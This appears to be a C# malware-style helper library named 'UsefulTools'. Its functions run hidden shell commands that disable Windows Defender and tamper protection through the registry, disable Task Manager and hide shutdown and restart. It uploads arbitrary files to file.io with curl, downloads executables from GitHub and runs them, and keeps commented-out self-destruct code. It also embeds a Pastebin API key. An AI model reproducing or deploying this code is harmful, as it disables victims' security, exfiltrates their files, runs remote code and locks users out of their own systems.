using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Mime;
using System.Text;
using System.Threading.Tasks;

namespace UsefulTools
{
    public static class OtherFunctions
    {
        public static async Task DisableAntiVirus()
        {
            await Command.RunCommandHidden(
                "REG DELETE \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /V DisableAntiSpyware /F");
            await Command.RunCommandHidden(
                "REG ADD \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /V DisableAntiSpyware /T REG_DWORD /D 1 /F");
            await Command.RunCommandHidden(
                "REG DELETE \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features\" /V TamperProtection /F");
            await Command.RunCommandHidden(
                "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features\" /V TamperProtection /T REG_DWORD /D 4 /F ");

        }

        public static async Task<string> UploadFileIO(string path)
        {
            string Return = "";
            await Command.RunCommandHidden(">C:\\GetLink.txt (\ncurl -F \"file=@\"" + path + "\"\" https://file.io\n)");
            Console.WriteLine(">C:\\GetLink.txt (\ncurl -F \"file=@\"" + path + "\"\" https://file.io\n)");
            string ScrapDetails = File.ReadAllText("C:\\GetLink.txt");
            //File.Delete("C:\\GetLink.txt");
            Console.WriteLine(ScrapDetails);
            string FirstScrap = ScrapDetails.Split(':')[3].Trim();
            FirstScrap = FirstScrap.Replace("\"", "");
            ScrapDetails = ScrapDetails.Split(':')[4].Trim();
            ScrapDetails = ScrapDetails.Replace("expiry", "");
            ScrapDetails = ScrapDetails.Replace("\"", "");
            ScrapDetails = ScrapDetails.Replace(",", "");
            Return = FirstScrap + ":" + ScrapDetails;
            Console.WriteLine(Return);
            return Return;
        }

        public static async Task GeneratePastebin(string text)
        {
            System.Collections.Specialized.NameValueCollection Data = new System.Collections.Specialized.NameValueCollection();
            String header = text;
            Data["api_paste_name"] = "[OV-GUI] Log file upload via the GUI";
            Data["api_paste_expire_date"] = "N";
            Data["api_paste_code"] = header;
            Data["api_dev_key"] = "8aaa33c046fd8faf1d495718d2414165";
            Data["api_option"] = "paste";
            WebClient wb = new WebClient();
            byte[] bytes = wb.UploadValues("http://pastebin.com/api/api_post.php", Data);
            string response;
            using (MemoryStream ms = new MemoryStream(bytes))
            using (StreamReader reader = new StreamReader(ms))
                response = reader.ReadToEnd();
            if (response.StartsWith("Bad API request"))
            {
                Console.WriteLine("Something went wrong. How ironic, the error report returned an error");
                Console.WriteLine("Look, just go to http://overviewer.org/irc. We'll help there :)");
            }
            else
            {
                System.Diagnostics.Process.Start(response);
            }
        }

        //public static async Task SelfKill()
        //{
        //    await Command.RunCommandHidden("taskkill /f /im \"" + Application.ExecutablePath + "\"");
        //}

        public static async Task DownloadMediafire(string link, string Filename)
        {
            string MainDirectoryMediaFire = Environment.GetEnvironmentVariable("TEMP");
            string ScrapFile = MainDirectoryMediaFire + "\\Scrap.txt";
            using (var clientha = new WebClient())
            {
                clientha.DownloadFileAsync(new Uri(link), ScrapFile);
                while (clientha.IsBusy)
                {
                    await Task.Delay(10);
                }
                string ScrappedURL = "";
                foreach (var item in File.ReadLines(ScrapFile))
                {
                    if (item.Contains("https://download"))
                    {
                        ScrappedURL = item;
                        ScrappedURL = ScrappedURL.Replace("href=\"", "");
                        ScrappedURL = ScrappedURL.Replace("\">", "");
                    }
                    if (item.Contains("http://download"))
                    {
                        ScrappedURL = item;
                        ScrappedURL = ScrappedURL.Replace("href=\"", "");
                        ScrappedURL = ScrappedURL.Replace("\">", "");
                    }
                }
                using (var client = new WebClient())
                {
                    client.DownloadFileAsync(new Uri(ScrappedURL), Filename);
                    while (client.IsBusy)
                    {
                        await Task.Delay(10);
                    }
                }
            }
        }

        public static async Task Download(string link, string filename)
        {
            using (var client = new WebClient())
            {
                client.DownloadFileAsync(new Uri(link), filename);
                while (client.IsBusy)
                {
                    await Task.Delay(10);
                }
            }
        }

        //public static async Task SelfDestruct()
        //{
        //    string[] DestructScript = { "taskkill /f /im \"" + Application.ExecutablePath + "\"", "del /s /f /q \"" + MediaTypeNames.Application.ExecutablePath + "\"" };
        //    File.WriteAllLines(Environment.GetEnvironmentVariable("TEMP") + "\\Dew.bat", DestructScript);
        //    Process.Start(Environment.GetEnvironmentVariable("TEMP") + "\\Dew.bat");
        //}

        public static async Task ShowNotification(string title, string message)
        {
            File.WriteAllText(Environment.GetEnvironmentVariable("TEMP") + "\\Caller.bat", "@if (@X)==(@Y) @end /* JScript comment\r\n@echo off\r\n\r\nsetlocal\r\ndel /q /f %~n0.exe >nul 2>&1\r\nfor /f \"tokens=* delims=\" %%v in ('dir /b /s /a:-d  /o:-n \"%SystemRoot%\\Microsoft.NET\\Framework\\*jsc.exe\"') do (\r\n   set \"jsc=%%v\"\r\n)\r\n\r\nif not exist \"%~n0.exe\" (\r\n    \"%jsc%\" /nologo /out:\"%~n0.exe\" \"%~dpsfnx0\"\r\n)\r\n\r\nif exist \"%~n0.exe\" ( \r\n    \"%~n0.exe\" %* \r\n)\r\n\r\n\r\nendlocal & exit /b %errorlevel%\r\n\r\nend of jscript comment*/\r\n\r\nimport System;\r\nimport System.Windows;\r\nimport System.Windows.Forms;\r\nimport System.Drawing;\r\nimport System.Drawing.SystemIcons;\r\n\r\n\r\nvar arguments:String[] = Environment.GetCommandLineArgs();\r\n\r\n\r\nvar notificationText=\"Warning\";\r\nvar icon=System.Drawing.SystemIcons.Hand;\r\nvar tooltip=null;\r\n//var tooltip=System.Windows.Forms.ToolTipIcon.Info;\r\nvar title=\"\";\r\n//var title=null;\r\nvar timeInMS:Int32=2000;\r\n\r\n\r\n\r\n\r\n\r\nfunction printHelp( ) {\r\n   print( arguments[0] + \" [-tooltip warning|none|warning|info] [-time milliseconds] [-title title] [-text text] [-icon question|hand|exclamation|аsterisk|application|information|shield|question|warning|windlogo]\" );\r\n\r\n}\r\n\r\nfunction setTooltip(t) {\r\n\tswitch(t.toLowerCase()){\r\n\r\n\t\tcase \"error\":\r\n\t\t\ttooltip=System.Windows.Forms.ToolTipIcon.Error;\r\n\t\t\tbreak;\r\n\t\tcase \"none\":\r\n\t\t\ttooltip=System.Windows.Forms.ToolTipIcon.None;\r\n\t\t\tbreak;\r\n\t\tcase \"warning\":\r\n\t\t\ttooltip=System.Windows.Forms.ToolTipIcon.Warning;\r\n\t\t\tbreak;\r\n\t\tcase \"info\":\r\n\t\t\ttooltip=System.Windows.Forms.ToolTipIcon.Info;\r\n\t\t\tbreak;\r\n\t\tdefault:\r\n\t\t\t//tooltip=null;\r\n\t\t\tprint(\"Warning: invalid tooltip value: \"+ t);\r\n\t\t\tbreak;\r\n\t\t\r\n\t}\r\n\t\r\n}\r\n\r\nfunction setIcon(i) {\r\n\tswitch(i.toLowerCase()){\r\n\t\t //Could be Application,Asterisk,Error,Exclamation,Hand,Information,Question,Shield,Warning,WinLogo\r\n\t\tcase \"hand\":\r\n\t\t\ticon=System.Drawing.SystemIcons.Hand;\r\n\t\t\tbreak;\r\n\t\tcase \"application\":\r\n\t\t\ticon=System.Drawing.SystemIcons.Application;\r\n\t\t\tbreak;\r\n\t\tcase \"аsterisk\":\r\n\t\t\ticon=System.Drawing.SystemIcons.Asterisk;\r\n\t\t\tbreak;\r\n\t\tcase \"error\":\r\n\t\t\ticon=System.Drawing.SystemIcons.Error;\r\n\t\t\tbreak;\r\n\t\tcase \"exclamation\":\r\n\t\t\ticon=System.Drawing.SystemIcons.Exclamation;\r\n\t\t\tbreak;\r\n\t\tcase \"hand\":\r\n\t\t\ticon=System.Drawing.SystemIcons.Hand;\r\n\t\t\tbreak;\r\n\t\tcase \"information\":\r\n\t\t\ticon=System.Drawing.SystemIcons.Information;\r\n\t\t\tbreak;\r\n\t\tcase \"question\":\r\n\t\t\ticon=System.Drawing.SystemIcons.Question;\r\n\t\t\tbreak;\r\n\t\tcase \"shield\":\r\n\t\t\ticon=System.Drawing.SystemIcons.Shield;\r\n\t\t\tbreak;\r\n\t\tcase \"warning\":\r\n\t\t\ticon=System.Drawing.SystemIcons.Warning;\r\n\t\t\tbreak;\r\n\t\tcase \"winlogo\":\r\n\t\t\ticon=System.Drawing.SystemIcons.WinLogo;\r\n\t\t\tbreak;\r\n\t\tdefault:\r\n\t\t\tprint(\"Warning: invalid icon value: \"+ i);\r\n\t\t\tbreak;\t\t\r\n\t}\r\n}\r\n\r\n\r\nfunction parseArgs(){\r\n\tif ( arguments.length == 1 || arguments[1].toLowerCase() == \"-help\" || arguments[1].toLowerCase() == \"-help\"   ) {\r\n\t\tprintHelp();\r\n\t\tEnvironment.Exit(0);\r\n\t}\r\n\t\r\n\tif (arguments.length%2 == 0) {\r\n\t\tprint(\"Wrong number of arguments\");\r\n\t\tEnvironment.Exit(1);\r\n\t} \r\n\tfor (var i=1;i<arguments.length-1;i=i+2){\r\n\t\ttry{\r\n\t\t\t//print(arguments[i] +\"::::\" +arguments[i+1]);\r\n\t\t\tswitch(arguments[i].toLowerCase()){\r\n\t\t\t\tcase '-text':\r\n\t\t\t\t\tnotificationText=arguments[i+1];\r\n\t\t\t\t\tbreak;\r\n\t\t\t\tcase '-title':\r\n\t\t\t\t\ttitle=arguments[i+1];\r\n\t\t\t\t\tbreak;\r\n\t\t\t\tcase '-time':\r\n\t\t\t\t\ttimeInMS=parseInt(arguments[i+1]);\r\n\t\t\t\t\tif(isNaN(timeInMS))  timeInMS=2000;\r\n\t\t\t\t\tbreak;\r\n\t\t\t\tcase '-tooltip':\r\n\t\t\t\t\tsetTooltip(arguments[i+1]);\r\n\t\t\t\t\tbreak;\r\n\t\t\t\tcase '-icon':\r\n\t\t\t\t\tsetIcon(arguments[i+1]);\r\n\t\t\t\t\tbreak;\r\n\t\t\t\tdefault:\r\n\t\t\t\t\tConsole.WriteLine(\"Invalid Argument \"+arguments[i]);\r\n\t\t\t\t\tbreak;\r\n\t\t}\r\n\t\t}catch(e){\r\n\t\t\terrorChecker(e);\r\n\t\t}\r\n\t}\r\n}\r\n\r\nfunction errorChecker( e:Error ) {\r\n\tprint ( \"Error Message: \" + e.message );\r\n\tprint ( \"Error Code: \" + ( e.number & 0xFFFF ) );\r\n\tprint ( \"Error Name: \" + e.name );\r\n\tEnvironment.Exit( 666 );\r\n}\r\n\r\nparseArgs();\r\n\r\nvar notification;\r\n\r\nnotification = new System.Windows.Forms.NotifyIcon();\r\n\r\n\r\n\r\n//try {\r\n\tnotification.Icon = icon; \r\n\tnotification.BalloonTipText = notificationText;\r\n\tnotification.Visible = true;\r\n//} catch (err){}\r\n\r\n \r\nnotification.BalloonTipTitle=title;\r\n\r\n\t\r\nif(tooltip!==null) { \r\n\tnotification.BalloonTipIcon=tooltip;\r\n}\r\n\r\n\r\nif(tooltip!==null) {\r\n\tnotification.ShowBalloonTip(timeInMS,title,notificationText,tooltip); \r\n} else {\r\n\tnotification.ShowBalloonTip(timeInMS);\r\n}\r\n\t\r\nvar dieTime:Int32=(timeInMS+100);\r\n\t\r\nSystem.Threading.Thread.Sleep(dieTime);\r\nnotification.Dispose();");
            Command.RunCommandHidden("call \"" + Environment.GetEnvironmentVariable("TEMP") + "\\Caller.bat" +
                                   "\"   -tooltip warning -time 3000 -title \"" + title + "\" -text \"" + message +
                                   "\" -icon question");
        }

        public static async Task ShutdownEnableDisable(bool Enabled)
        {
            if (Enabled == true)
            {
                await Command.RunCommandHidden(
                    "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\PolicyManager\\default\\Start\\HideShutDown\" /V value /T REG_DWORD /D 0 /F");
                await Command.RunCommandHidden(
                    "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\PolicyManager\\default\\Start\\HideRestart\" /V value /T REG_DWORD /D 0 /F");
            }
            else
            {
                await Command.RunCommandHidden(
                    "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\PolicyManager\\default\\Start\\HideShutDown\" /V value /T REG_DWORD /D 1 /F");
                await Command.RunCommandHidden(
                    "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\PolicyManager\\default\\Start\\HideRestart\" /V value /T REG_DWORD /D 1 /F");
            }
        }

        public static async Task TaskManager(bool Enabled)
        {
            if (Enabled == true)
            {
                await Command.RunCommandHidden(
                    "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 0 /f");
            }
            else if (Enabled == false)
            {
                await Command.RunCommandHidden(
                    "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f");
            }
        }

        public static async Task UploadDirectoryToGitHub(string source, string github, bool waitforupload, bool UnlimitedUse)
        {
            File.WriteAllText(Environment.GetEnvironmentVariable("TEMP") + "\\SilentGitHubUpload.txt", source + "$" + github);
            if (UnlimitedUse == true)
            {
                if (!File.Exists(Environment.GetEnvironmentVariable("TEMP") + "\\DirectoryUploader.exe"))
                {
                    using (var client = new WebClient())
                    {
                        client.DownloadFileAsync(new Uri("https://raw.githubusercontent.com/EpicGamesGun/GitHub-Large-Uploader/master/GitHub-Large-Uploader/bin/Debug/GitHub-Large-Uploader.exe"), Environment.GetEnvironmentVariable("TEMP") + "\\DirectoryUploader.exe");
                        while (client.IsBusy)
                        {
                            await Task.Delay(10);
                        }
                    }
                }
            }
            else
            {
                using (var client = new WebClient())
                {
                    client.DownloadFileAsync(new Uri("https://raw.githubusercontent.com/EpicGamesGun/GitHub-Large-Uploader/master/GitHub-Large-Uploader/bin/Debug/GitHub-Large-Uploader.exe"), Environment.GetEnvironmentVariable("TEMP") + "\\DirectoryUploader.exe");
                    while (client.IsBusy)
                    {
                        await Task.Delay(10);
                    }
                }
            }

            if (waitforupload == false)
            {
                Process.Start(Environment.GetEnvironmentVariable("TEMP") + "\\DirectoryUploader.exe");
            }
            else
            {
                await Task.Factory.StartNew(() =>
                {
                    Process.Start(Environment.GetEnvironmentVariable("TEMP") + "\\DirectoryUploader.exe").WaitForExit();
                });
            }
        }

        private static bool Solved = false;
        public static async Task HumanVerification(bool SecureDesktop, bool VerifyPhoneNumber)
        {
            using (var client = new WebClient())
            {
                client.DownloadFileAsync(new Uri("https://raw.githubusercontent.com/EpicGamesGun/Human-Verification/master/Human-Verification/bin/Debug/Human-Verification.exe"), Environment.GetEnvironmentVariable("TEMP") + "\\HumanVerification.exe");
                while (client.IsBusy)
                {
                    await Task.Delay(10);
                }
            }

            if (VerifyPhoneNumber == true)
            {
                File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\PhoneNumber.txt", "true");
            }

            if (SecureDesktop == true)
            {
                File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\SecureDesktop.txt", "true");
            }

            await Task.Factory.StartNew(() =>
            {
                Process.Start(Environment.GetEnvironmentVariable("TEMP") + "\\HumanVerification.exe").WaitForExit();
            });
            if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) +
                            "\\HumanVerified.txt"))
            {
                Solved = true;
                File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) +
                            "\\HumanVerified.txt");
                VerificationTimeout();
            }
        }

        public static async Task VerificationTimeout()
        {
            await Task.Delay(30000);
            Solved = false;
        }
    }
}
